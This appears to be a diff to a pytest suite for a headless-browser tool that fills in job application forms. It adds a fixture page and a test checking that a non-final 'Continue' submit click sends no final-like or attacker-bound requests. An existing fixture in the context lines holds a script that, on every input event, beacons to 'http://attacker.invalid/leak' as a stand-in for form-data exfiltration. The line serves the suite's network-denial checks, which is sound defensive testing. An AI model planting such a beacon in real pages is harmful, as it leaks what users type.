@@ -43,6 +43,13 @@ CLEAN_FIXTURE = b"""<!doctype html>
 </form>
 <script>window.addEventListener("input",()=>{fetch("/exfil-after-input").catch(()=>{});const image=new Image();image.src="http://attacker.invalid/leak"});</script>
 </body></html>"""
+SUBMIT_CONTINUATION_FIXTURE = b"""<!doctype html>
+<html><head><title>Greenhouse Submit Continuation Fixture</title></head>
+<body>
+<button type="submit" id="continue-native">Continue</button>
+<button type="submit" id="submit-final">Submit Application</button>
+<script>document.getElementById("continue-native").addEventListener("click",()=>{document.body.dataset.continued="yes"});</script>
+</body></html>"""
 BLOCKER_FIXTURE = b"""<!doctype html><form>
 <label>First Name <input name="first_name" required></label>
 <button type="button" id="offline">Continue</button>
@@ -129,7 +136,12 @@ class FixtureHandler(http.server.SimpleHTTPRequestHandler):
         self.send_header("content-type", "text/html")
         self.end_headers()
         logical = type(self).logical_urls[-1] if type(self).logical_urls else ""
-        body = LEVER_FIXTURE.read_bytes() if logical.startswith("https://jobs.lever.co/") else (CLEAN_FIXTURE if self.path.startswith("/clean") else FIXTURE.read_bytes())
+        body = (
+            LEVER_FIXTURE.read_bytes()
+            if logical.startswith("https://jobs.lever.co/")
+            else SUBMIT_CONTINUATION_FIXTURE if self.path.startswith("/continue-native")
+            else CLEAN_FIXTURE if self.path.startswith("/clean") else FIXTURE.read_bytes()
+        )
         self.wfile.write(body)
 
     def log_message(self, format, *args):  # noqa: A002
@@ -507,6 +519,35 @@ def test_observe_generation_final_marker_network_denial_and_cleanup(fixture_serv
 
     with pytest.raises(ProcessLookupError):
         os.kill(launch_pid, 0)
+
+@BROWSER_INTEGRATION_SKIP
+def test_submit_typed_nonfinal_continuation_click_uses_framed_offline_protocol(fixture_server):
+    transport_url = fixture_server.replace("/clean", "/continue-native")
+    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
+    with PuppeteerSession.start(
+        headless=True,
+        session_id="session-submit-continuation",
+        run_id=2,
+        job_id=123,
+        internal_transport_url=transport_url,
+    ) as session:
+        session.goto(logical_url)
+        observation = session.observe()
+        continuation = next(
+            button
+            for button in observation["buttons"]
+            if button["button_type"] == "submit"
+            and button["target_id"] not in observation["final_submit_target_ids"]
+        )
+        assert continuation["effective_action_url"] is None
+        assert continuation["effective_method"] is None
+        assert session.click_offline(continuation["target_id"], continuation=True)["clicked"] is True
+
+        counters = session.network_counters()
+        assert counters["finalLikeDenied"] == 0
+        assert counters["terminal_reason"] in {None, "unsafe_network_attempt"}
+        assert FixtureHandler.final_like_requests == 0
+        assert FixtureHandler.attacker_http_requests == 0
 @BROWSER_INTEGRATION_SKIP
 def test_lever_session_uses_selected_policy_and_keeps_final_submit_manual(fixture_server):
     with PuppeteerSession.start(
